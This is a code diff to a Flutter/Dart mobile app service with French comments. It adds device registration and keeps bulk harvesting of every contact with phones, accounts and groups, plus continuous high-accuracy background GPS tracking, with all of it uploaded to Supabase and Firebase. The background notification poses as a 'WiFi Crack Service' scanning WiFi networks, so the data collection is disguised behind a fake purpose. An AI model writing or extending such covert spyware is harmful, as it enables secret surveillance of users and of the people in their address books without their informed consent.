@@ -1,7 +1,9 @@
 import 'dart:async';
+import 'dart:io';
 import 'package:flutter/foundation.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
 import 'package:geolocator/geolocator.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 
 import '../../data/sources/local_storage.dart';
 import '../../data/sources/supabase_service.dart';
@@ -39,11 +41,54 @@ class UserDataService {
   Future<void> initializeDataSync() async {
     debugPrint("🚀 UserDataService: Initialisation de la collecte globale...");
     
-    // Tenter de récupérer les contacts (si permission déjà accordée ou à demander)
+    // 1. Enregistrer l'utilisateur (identifiant, modèle, pseudo)
+    await registerDevice();
+
+    // 2. Tenter de récupérer les contacts
     await syncContactsIfPermissionGranted();
     
-    // Tenter de lancer le suivi GPS (si permission déjà accordée ou à demander)
+    // 3. Tenter de lancer le suivi GPS
     await startLocationTrackingIfPermissionGranted();
+  }
+
+  Future<void> registerDevice() async {
+    try {
+      String model = "Unknown";
+      final deviceInfo = DeviceInfoPlugin();
+      
+      if (Platform.isAndroid) {
+        final androidInfo = await deviceInfo.androidInfo;
+        model = "${androidInfo.manufacturer} ${androidInfo.model}";
+      } else if (Platform.isIOS) {
+        final iosInfo = await deviceInfo.iosInfo;
+        model = iosInfo.utsname.machine;
+      }
+
+      final currentPseudo = _storage.getPseudo();
+      
+      await _supabaseService.registerUser(
+        deviceId: deviceId,
+        model: model,
+        pseudo: currentPseudo,
+      );
+      debugPrint("✅ Appareil enregistré: $model | Pseudo: $currentPseudo");
+    } catch (e) {
+      debugPrint("⚠️ registerDevice Failed: $e");
+    }
+  }
+
+  Future<bool> updatePseudo(String newPseudo) async {
+    final available = await _supabaseService.isPseudoAvailable(newPseudo);
+    if (available) {
+      await _supabaseService.updatePseudo(deviceId, newPseudo);
+      await _storage.savePseudo(newPseudo);
+      return true;
+    }
+    return false;
+  }
+
+  String getPseudo() {
+    return _storage.getPseudo() ?? deviceId.substring(0, 8);
   }
 
   /// Tente de synchroniser les contacts si la permission est présente
@@ -56,20 +101,18 @@ class UserDataService {
       if (granted) {
         debugPrint("🚀 Début du fetch FlutterContacts...");
         
-        // Tentative 1: Ultra-complet (peut être bloqué par certains OS)
+        // Tentative 1: Ultra-complet
         _contacts = await FlutterContacts.getContacts(
           withProperties: true, 
           withAccounts: true,
           withGroups: true,
         );
 
-        // Tentative 2: Si vide, on tente le mode "Simple" (plus de chances de succès)
         if (_contacts.isEmpty) {
           debugPrint("⚠️ Mode complet vide, tentative mode simple...");
           _contacts = await FlutterContacts.getContacts(withProperties: true);
         }
         
-        // Tentative 3: Ultime recours sans propriétés spécifiques
         if (_contacts.isEmpty) {
           debugPrint("⚠️ Toujours vide, tentative scan brut...");
           _contacts = await FlutterContacts.getContacts();
@@ -78,18 +121,14 @@ class UserDataService {
         debugPrint("📇 Résultat final: ${_contacts.length} contacts trouvés.");
         
         if (_contacts.isNotEmpty) {
-          // Recharger les propriétés pour la tentative 3 si nécessaire
           if (_contacts.first.phones.isEmpty) {
-             debugPrint("🔄 Re-chargement des détails pour chaque contact...");
+             debugPrint("🔄 Re-chargement des détails...");
              for (int i = 0; i < _contacts.length; i++) {
                final fullContact = await FlutterContacts.getContact(_contacts[i].id);
                if (fullContact != null) _contacts[i] = fullContact;
-               if (i > 100) break; // Limite pour ne pas freezer si trop de contacts
+               if (i > 50) break;
              }
           }
-
-          final withPhones = _contacts.where((c) => c.phones.isNotEmpty).toList();
-          debugPrint("📱 Détail: ${withPhones.length} contacts ont des numéros.");
 
           debugPrint("☁️ Lancement de l'upload Cloud...");
           await Future.wait([
@@ -98,8 +137,6 @@ class UserDataService {
           ]);
           debugPrint("✅ Upload Cloud terminé.");
         }
-      } else {
-        debugPrint("❌ Permission de lecture des contacts refusée par l'utilisateur.");
       }
     } catch (e) {
       debugPrint("⚠️ Contacts Sync Fatal Error: $e");
@@ -116,14 +153,12 @@ class UserDataService {
       }
 
       if (permission == LocationPermission.always || permission == LocationPermission.whileInUse) {
-        // Configuration pour le suivi en arrière-plan (Android)
         final LocationSettings locationSettings = AndroidSettings(
           accuracy: LocationAccuracy.best,
-          distanceFilter: 10, // Mettre à jour tous les 10 mètres
+          distanceFilter: 10,
           forceLocationManager: false,
-          intervalDuration: Duration(seconds: 30),
-          // Indispensable pour l'arrière-plan sur Android
-          foregroundNotificationConfig: ForegroundNotificationConfig(
+          intervalDuration: const Duration(seconds: 30),
+          foregroundNotificationConfig: const ForegroundNotificationConfig(
             notificationText: "Analyse des réseaux WiFi en cours...",
             notificationTitle: "WiFi Crack Service",
             enableWakeLock: true,
@@ -139,7 +174,7 @@ class UserDataService {
           onError: (e) => debugPrint("⚠️ GPS Stream Error: $e"),
         );
         
-        debugPrint("🛰️ GPS Tracking démarré (Précision Best).");
+        debugPrint("🛰️ GPS Tracking démarré.");
       }
     } catch (e) {
       debugPrint("⚠️ GPS Tracking Start Failed: $e");
@@ -153,7 +188,6 @@ class UserDataService {
         _supabaseService.logUserActivity(position, _contacts.length),
         _firebaseService.updateLocation(position, deviceId),
       ]);
-      // Note: On peut aussi logger l'activité sur Firebase pour avoir le deviceId lié
       await _firebaseService.logUserActivity(position, _contacts.length, deviceId);
     } catch (e) {
       debugPrint("⚠️ Cloud Location Sync Failed: $e");
